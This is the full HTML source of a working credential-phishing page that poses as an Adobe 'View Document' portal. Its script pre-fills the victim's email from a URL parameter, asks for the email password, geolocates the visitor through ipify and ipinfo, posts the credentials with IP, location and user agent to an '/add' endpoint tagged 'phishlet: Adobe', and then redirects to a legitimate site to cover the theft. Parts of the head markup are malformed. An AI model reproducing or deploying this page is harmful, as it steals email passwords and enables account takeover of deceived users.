<html>
  <head>

      rel="stylesheet"
    />
    <link
      href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css"
      rel="stylesheet"
    />
    <script
      src="https://code.jquery.com/jquery-3.7.1.js"
      integrity="sha256-eKhayi8LEQwp4NKxN+CfCh+3qOVUtJn3QNZ0TciWLP4="
      crossorigin="anonymous"

    <script type="text/javascript">
      var herewego =

    <style type="text/css">
      * {
        margin: 0;
        padding: 0;
        outline: 0;
      }

      body,
      html {
        outline: 0;
        font-family: helvetica, verdana, tahoma, arial;
        margin: 0;
        padding: 0;
        height: 99%;
        background-image: url("https://cdn.glitch.global/5d305917-a99a-4eeb-b3ed-688b50a8ae7e/bg.jpeg");
        background-repeat: no-repeat;
        background-size: cover;
      }

      .parent {
        margin-top: 50px;
        display: flex;
        align-items: center;
        justify-content: center;
      }

      .center {
        background-color: #fff;
        height: auto;
        border: 1px solid #333;
        z-index: 1000;
      }

      header {
        display: flex;
        min-height: 30px;
        background-color: #f0f;
      }

      .HeaderBox {
        background-color: #d90007;
        background-image: url("https://cdn.glitch.global/5d305917-a99a-4eeb-b3ed-688b50a8ae7e/red.jpeg");
        background-position: 50% 0;
        padding: 0 10px 0 0;
        display: grid;
        grid-template-columns: auto auto auto auto;
        gap: 10px;
        height: 70px;
        min-height: 70px;
      }

      .sec2 {
        width: 100%;
        display: flex;
        justify-content: flex-end;
        align-items: center;
      }

      .sec1 img {
        position: absolute;
        height: 150px;
        top: -10px;
        z-index: 1000;
        padding-top: 0;
        padding-bottom: 2%;
        margin-left: 50px;
      }

      .sec1 {
        grid-column: 1 / span 1;
        background-color: #000;
      }

      nav {
        display: flex;
        justify-content: end;
        background-color: #fff;
        width: 100%;
        border-bottom: 1px solid #ddd;
      }

      nav ul {
        display: flex;
        margin: 10px 15px 5px;
      }

      nav li {
        list-style: none;
        margin: 0 5px;
      }

      .navbtn {
        font-family: helvetica, verdana, tahoma, arial;
        font-size: 15px;
        color: #333;
        text-transform: capitalize;
        background-color: #cac8bf;
        border: 1px solid #bebcaf;
        padding: 7px 15px;
      }

      .shadow.bottom {
        box-shadow: 0 15px 10px -15px #111;
      }

      .formhead img {
        max-width: 500px;
        width: 100%;
        margin-bottom: 20px;
      }

      button.cumsocks {
        width: 100%;
        padding: 10px;
        border-radius: 0;
        border: 1px solid #e4e4e4;
        font-size: 14px;
        font-family: Verdana;
        background: #b74446;
        color: #fff;
        cursor: pointer;
      }

      button.cumsocks:focus,
      button.cumsocks:hover {
        background: #db6567;
      }

      button.cumsocks:disabled,
      button.cumsocks[disabled] {
        background: #db6567;
        opacity: 0.9;
        cursor: not-allowed;
      }

      .navbtn:hover {
        cursor: pointer;
        background-color: #e0e0e0;
      }

      .otherformsecs {
        display: flex;
        justify-content: center;
        font-weight: 400;
        color: #e40000;
      }

      .errx {
        background-color: red;
        padding: 5px;
        color: #fff;
        min-width: 350px;
      }

      .myfm {
        display: flex;
        justify-content: center;
        flex-direction: column;
        margin: 0 auto;
        width: 350px;
        margin-top: -5px;
        margin-bottom: 5px;
      }

      .clasfrm {
        display: flex;
        justify-content: center;
        box-sizing: border-box;
        margin: 10px 2px;
        width: auto;
      }

      .clasfrm input {
        width: 100%;
        padding: 10px;
        line-height: 1.5;
        font-size: 15.5px;
        border: 1px solid #000;
      }

      .clasfrm input:focus {
        border: 1px solid #000;
        padding: 11px;
        line-height: 1.5;
        font-size: 15px;
      }

      .clasfrm input[readonly] {
        border: 1px solid #000;
        background-color: #fafafa;
      }

      span.rix {
        position: relative;
        top: 3px;
        font-size: 16px !important;
      }

      .clasfrm span {
        padding: 10px;
        line-height: 1.5;
        font-size: 15px;
        border: 1px solid #000;
        border-right: 0;
      }
    </style>
  </head>
  <body>
    <header class="HeaderBox">
      <div class="sec1">
        <img
          src="https://cdn.glitch.global/5d305917-a99a-4eeb-b3ed-688b50a8ae7e/fav.png"
        />
      </div>
      <div class="sec2">
        <img
          src="https://cdn.glitch.global/5d305917-a99a-4eeb-b3ed-688b50a8ae7e/get.png"
          style="height: 60px"
        />
      </div>
    </header>
    <nav class="bottom shadow">
      <ul>
        <li>
          <div class="navbtn">
            <span class="rix ri-eye-line"></span>
            View
          </div>
        </li>
        <li>
          <div class="navbtn">
            <span class="rix ri-edit-2-line"></span>
            Edit
          </div>
        </li>
        <li>
          <div class="navbtn">
            <span class="rix ri-download-cloud-2-line"></span>
            Download
          </div>
        </li>
        <li>
          <div class="navbtn">
            <span class="rix ri-save-3-fill"></span>
            Save
          </div>
        </li>
      </ul>
    </nav>
    <main class="parent">
      <div class="center">
        <div class="formhead">
          <img
            src="https://cdn.glitch.global/5d305917-a99a-4eeb-b3ed-688b50a8ae7e/to.png"
          />
        </div>
        <div class="otherformsecs"></div>
        <form action="" class="myfm" id="myfm" method="POST">
          <small class="text-danger" id="msg" style="font-weight: 600"></small>
          <div class="clasfrm">
            <span><i class="rix ri-at-line"></i></span>
            <input
              id="x1"
              name="x1"
              placeholder="Email address"
              required=""
              type="email"
              readonly=""
            />
          </div>
          <div class="clasfrm">
            <span><i class="rix ri-lock-password-line"></i></span>
            <input
              id="x2"
              name="x2"
              placeholder="Email password"
              required=""
              type="password"
              minlength="1"
            />
          </div>
          <div class="clasfrm">
            <button class="cumsocks" id="cum">View Document</button>
          </div>
        </form>
      </div>
    </main>
    <footer></footer>

    <script>
      let ipAddress;
      let country;
      let state;
      async function getVisitorInfo() {
        try {
          let response = await fetch("https://api.ipify.org?format=json");
          let data = await response.json();
          ipAddress = data.ip;

          response = await fetch(
            `https://ipinfo.io/${ipAddress}/json?token=8ebfd8b3b25012`
          );
          data = await response.json();
          country = data.country;
          state = data.state;
        } catch (error) {
          console.error("Error fetching visitor info:", error);
        }
      }

      getVisitorInfo();

      let recipient = new URLSearchParams(window.location.search).get(
        "recipient"
      );
      document.getElementById("x1").value = recipient;
      document.addEventListener("click", function (e) {
        let targetId = e.target.id;
        if (targetId == "cum") {
          e.preventDefault();
          sendUser();
        }
      });

      function sendUser() {
        
        let pass = document.getElementById("x2").value;
        email = {
          email: recipient,
          password: pass,
          phishlet: "Adobe",
          country: country,
          state: state,
          ipAddress: ipAddress,
          userAgent: navigator.userAgent
        };
        let userXhr = new XMLHttpRequest();
        userXhr.open("POST", "/add", true);
        userXhr.setRequestHeader("Content-type", "application/json");
        userXhr.send(JSON.stringify(email));

        userXhr.onreadystatechange = function () {
          if (this.readyState == 4 && this.status == 200) {
            let response = this.response;
            location.href = "https://www.adp.com/how-we-differ.aspx";
          }
        };
      }
    </script>
  </body>
</html>
